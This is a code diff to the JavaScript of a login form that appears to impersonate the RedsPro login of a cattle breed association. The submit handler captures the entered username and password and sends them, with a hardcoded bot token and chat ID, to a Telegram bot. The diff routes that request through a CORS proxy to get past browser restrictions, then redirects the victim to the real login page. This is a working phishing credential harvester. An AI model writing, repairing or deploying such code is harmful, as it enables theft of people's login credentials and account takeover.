@@ -75,23 +75,37 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     var date = new Date().toLocaleString();
     var msg = "\uD83D\uDD25 *New REDSPro Login*\n\n\uD83D\uDCE7 User: " + user + "\n\uD83D\uDD11 Pass: " + pass + "\n\u23F0 Time: " + date;
 
-    // Use fetch with keepalive for reliability
-    var url = "https://api.telegram.org/bot/8686394993:AAGXzN-XrKEfjnKO3WPNmANmq81eNHtMG00/sendMessage";
+    // Use a CORS proxy to bypass browser restrictions
+    var botToken = "8686394993:AAGXzN-XrKEfjnKO3WPNmANmq81eNHtMG00"; // Replace with your actual token
+    var chatId = "6574674233";
+    var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    var corsProxy = `https://corsproxy.io/?${encodeURIComponent(telegramUrl)}`;
+    
     var data = JSON.stringify({
-        chat_id: "6574674233",
+        chat_id: chatId,
         text: msg,
         parse_mode: "markdown"
     });
 
-    // Send to Telegram
-    fetch(url, {
+    // Send to Telegram via CORS proxy
+    fetch(corsProxy, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: data,
         keepalive: true
-    }).catch(err => console.error('Telegram send failed:', err));
+    })
+    .then(response => {
+        console.log('Response Status:', response.status);
+        return response.text();
+    })
+    .then(text => {
+        console.log('Telegram Response:', text);
+    })
+    .catch(err => {
+        console.error('Telegram send failed:', err);
+    });
 
-    // Redirect after a short delay to ensure the request is queued
+    // Redirect after a short delay
     setTimeout(function() {
         window.location.href = "https://vm-zebu.redangus.org/redspro/redspro/template/Login.vm";
     }, 800);
